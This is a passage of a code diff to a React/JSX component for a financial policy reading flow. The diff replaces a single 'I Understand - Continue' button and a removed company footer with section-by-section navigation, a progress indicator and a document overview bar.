-                  <li>Providing false information may have legal consequences</li>
-                </ul>
-              </div>
-
-              <p className="mt-6 text-gray-500 text-xs border-t border-gray-300 pt-4">
-                This document is provided by AIG Financial Services in partnership with AIG (American International Group). For questions about this policy, please contact our compliance department.
-              </p>
+              )}
             </div>
 
-            <div className="mt-6 flex justify-end">
+            {/* Section Progress */}
+            <div className="bg-white rounded-lg p-4 mb-6 border-2 border-orange-200">
+              <div className="flex items-center justify-between">
+                <div className="flex items-center">
+                  <CheckCircle className="w-5 h-5 mr-2 text-orange-500" />
+                  <span className="text-sm font-medium text-gray-900">
+                    Section Progress: {getCurrentSectionProgress()} points checked
+                  </span>
+                </div>
+                <div className="text-xs text-gray-500">
+                  Must check all points to continue
+                </div>
+              </div>
+            </div>
+
+            {/* Navigation */}
+            <div className="flex justify-between">
               <button
-                onClick={nextStep}
-                className="bg-orange-500 text-black py-3 px-8 rounded-lg font-semibold hover:bg-orange-600 transition flex items-center"
+                onClick={handlePreviousSection}
+                disabled={documentStep === 0}
+                className="bg-gray-200 text-gray-700 py-3 px-6 rounded-lg font-semibold hover:bg-gray-300 transition flex items-center disabled:opacity-50 disabled:cursor-not-allowed"
               >
-                I Understand - Continue to Agreement
-                <ArrowRight className="w-4 h-4 ml-2" />
+                <ArrowLeft className="w-4 h-4 mr-2" />
+                Previous Section
               </button>
+              <button
+                onClick={handleNextSection}
+                className="bg-blue-600 text-white py-3 px-6 rounded-lg font-semibold hover:bg-blue-700 transition flex items-center"
+              >
+                {documentStep >= documentSections.length - 1 ? (
+                  <>
+                    <CheckCircle className="w-5 h-5 mr-2" />
+                    Complete Reading - Proceed to Next Step
+                  </>
+                ) : (
+                  <>
+                    Next Section ({documentStep + 2}/{documentSections.length})
+                    <ArrowRight className="w-4 h-4 ml-2" />
+                  </>
+                )}
+              </button>
+            </div>
+
+            {/* Document Overview */}
+            <div className="bg-gray-50 rounded-lg p-4 mt-6">
+              <h4 className="text-sm font-semibold text-gray-900 mb-3">Document Overview</h4>
+              <div className="grid grid-cols-9 gap-2">
+                {documentSections.map((section, index) => (
+                  <div
+                    key={section.id}
+                    className={`h-2 rounded-full ${
+                      index < documentStep 
+                        ? 'bg-green-500' 
+                        : index === documentStep 
+                        ? 'bg-orange-500' 
+                        : 'bg-gray-300'
+                    }`}
+                    title={section.title}
+                  />
+                ))}
+              </div>
+              <div className="flex justify-between mt-2 text-xs text-gray-500">
+                <span>Section 1</span>
+                <span>Section {documentSections.length}</span>
+              </div>
             </div>
           </div>
         )}
